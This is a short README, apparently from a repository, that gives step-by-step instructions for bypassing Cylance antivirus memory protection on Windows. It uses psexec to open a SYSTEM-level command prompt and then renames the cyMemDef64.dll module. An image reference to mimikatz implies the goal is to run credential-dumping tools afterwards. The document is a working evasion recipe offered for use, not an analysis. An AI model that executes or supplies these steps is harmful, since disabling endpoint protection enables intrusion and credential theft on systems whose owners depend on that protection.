# Cylance-AV-Bypass
If you have access as NT Authoriy on system, you can bypass Cylance AV by renamin the cyMemDef64.dll for x64 and or cyMemDef.dll for 32bit.
1) Open up command prompt as NT System by running psexec.exe -i -s %SystemRoot%\system32\cmd.exe
2) Run move "C:\Program Files\Cylance\Desktop\cyMemDef64.dll" "C:\Program Files\Cylance\Desktop\cyMemDef64.dll.bak"
3) You can no bypass Cylance Memory protection. 
mimikatz-stforum.jpg

<image src="images/mimikatz-stforum.jpg.jpg" width="250" height="250">
